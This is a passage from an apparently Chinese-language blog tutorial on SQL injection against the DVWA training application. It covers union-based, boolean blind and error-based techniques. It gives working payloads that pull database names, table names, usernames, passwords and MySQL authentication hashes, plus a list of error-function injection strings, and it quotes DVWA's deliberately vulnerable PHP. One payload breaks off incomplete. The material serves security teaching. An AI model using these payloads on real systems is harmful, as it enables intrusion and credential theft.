获取第四个字段名字 secret 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 4,1)-- …………………………. 通过联合查询表里面的内容​ 通过以上操作我们已经获取了当前数据库的库名、表名、字段 那么我们就可以通过下面语句获取表里面的内容了 1-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1)-- boolean布尔型盲注入代码分析1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #id为字符串型 get接收id参数 $id = $_GET[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 接收 id 的值，直接带入查询，如果存在即返回 users is exists in the database 否则显示 users id is missing 像这种只有正确与错误页面。页面不会显示数据库 里任何内容，如果存在注入，成为盲注入。 ​ 盲注入的方法有两种：一是布尔型盲注入，二是延时注入 判断盲注入​ 我们可以通过1&#39; and &#39;1&#39;=&#39;1 和 1&#39; and &#39;1&#39;=&#39;2 是否一样 ​ 以及 1&#39; and sleep(10)--让他睡10s判断是否一样 Boolean布尔型注入攻击​ 因为页面不会返回查询的内容所以我们不能使用联合查询注入攻击，但是我们可以通过构造sql来获取数据。 ​ 11&#x27; and if(1=1,1,0)-- -- 三目运算 布尔型盲注入获取数据库敏感信息​ 在黑盒测试环境下，通过构造sql语句来进行获取敏感信息。 构造sql语句常用的函数： 1.SUBSTRING()字符串截取函数，第一个参数是字符串，第二个参数开始截取，第三个参数是截取的长度 我们可以构造这样的sql语句 1SELECT if(SUBSTRING(database(),1,1)=&#x27;d&#x27;,1,0) 如果截取的第一个字符是‘d’我们返回1 否则返回0 此类推。再后拼接字符就是完整的库名。 黑盒情况下进行布尔盲注入步骤： ​ 我们首先需要判断注入是否为布尔注入，判断完后就可以获取数据库的长度，得到长度再查询库名，然后查询表名，字段，字段内容。。。 布尔盲注入查询长度​ 通过构造如下sql语句进行数据库长度的查询 11&#x27; and if(length(database())=4,1,0)-- 判断出长度为4 布尔盲注入判断库名这一步操作其实就是通过遍历 10123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_ 与语句进行整合判断出是否返回1 11&#x27; and if(SUBSTRING(database(),1,1)=&#x27;$d&#x27;,1,0)-- 当然了，我们手动进行一个一个测试肯定很慢，那么我们可以借助burp来进行如此操作 带有构造sql语句的url 1http://192.168.18.137/01/vulnerabilities/sqli_blind/?id=1%27%20and%20if(SUBSTRING(database(),1,1)=%27d%27,1,0)--%20&amp;Submit=Submit# 再burp里面抓包然后送入intruder 先清除变量 然后再将数字和字母设为变量 攻击类型选择 cluster bomb 然后就是payloads里面两个变量的设置 然后开始攻击就行 跑出来的状态码为200即为成功！ 获得的数据库名为 dvwa 接着我们通过库名来获取表名 11&#x27; and if(SUBSTRING((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)-- 同样通过burp进行抓包 获取到表名guestbook 然后获取字段名 11&#x27; and if(SUBSTRING((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1,1),1,1)=&#x27;l&#x27;,1,0)-- 同样我们用burp进行爆破 得到字段名为login password等 获得完 字段后 我们可以进一步获取字段内容【账号+密码】 11&#x27; and if(SUBSTRING((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)-- 报错注入​ 顾名思义报错注入就是指数据库显示错误，比如sql语法错误 一般对于php。特别php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中 使用 mysql_error()函数 ​ 如果在查询注入时候会有报错信息返回，可以采用报错注入 报错注入分析1234567891011121314151617181920212223242526&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input # get传入id 字符串型 $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database # mysqli_error 函数返回错误信息 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 报错注入攻击​ 在输入框输入报错的sql拼接语句 11&#x27; and info()-- 它的原理是下面一条语句会执行但是会报错，在报错信息中会返回数据库名称 1SELECT first_name,last_name from users WHERE user_id=&#x27;1&#x27; and info() 报错注入获取敏感信息​ 通过构造sql语句，返回带有数据库敏感信息的错误信息 11&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- 注意：这里为什么要用updatexml()呢，首先要先了解这个函数 updatexml(xml_doument,XPath_string,new_value)第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据 简单点说，这个函数有三个参数，我们利用第二个参数必须要更改信息的xpath语句来进行报错注入。 为什么要在第二个参数里面加上concat语句呢？因为updatexml（）第二个参数需要进行xpath校验，如果第二个参数哪里不是xpath语句它会进行一次校验然后把校验后的错误信息返回 但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32 字符就要采用字符串截取方法。每次获取 32 个字符串的长度。 除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。 例如： 12345678910111213141516171819201.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) as x from information_schema.tables group by x)a);2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp()select * from test where id=1 and exp(~(select * from(select user())a)); 在黑盒模式下进行报错注入​ 流程还是根之前一样 库名-》表名-》字段-》字段内容 获取库名11&#x27; and (updatexml(1,(select concat(&#x27;`&#x27;,(select database()),&#x27;`&#x27;)),1))-- 获取表名 这次用floor报错，floor报错不会出现长度问题11&#x27; and (select 1 from (select count(*),concat((select (select(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)-- 获取表名为 guestbook 将limit 0,1 改成 1，1是获取第二个表users 获取字段获取users第一个字段 11&#x27; and (select 1 from(select count(*),,)) 获取账号密码 获取账号和密码需要root权限 123select authentication_string from mysql.user limit 1;select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://sfyyh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"https://sfyyh.github.io/tags/%E7%BD%91%E5%AE%89/"}]}],"categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://sfyyh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"网站搭建","slug":"网站搭建","permalink":"https://sfyyh.github.io/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"},{"name":"技术","slug":"技术","permalink":"https://sfyyh.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"proxy","slug":"proxy","permalink":"https://sfyyh.github.io/categories/proxy/"}],"tags":[{"name":"网安","slug":"网安","permalink":"https://sfyyh.github.io/tags/%E7%BD%91%E5%AE%89/"},{"name":"渗透必知必会","slug":"渗透必知必会","permalink":"https://sfyyh.github.io/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"},{"name":"宝塔面板","slug":"宝塔面板","permalink":"https://sfyyh.github.io/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"},{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"https://sfyyh.github.io/tags/dolphinscheduler/"},{"name":"大数据分析平台","slug":"大数据分析平台","permalink":"https://sfyyh.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"https://sfyyh.github.io/tags/GitHub/"},{"name":"clash","slug":"clash","permalink":"https://sfyyh.github.io/tags/clash/"}]}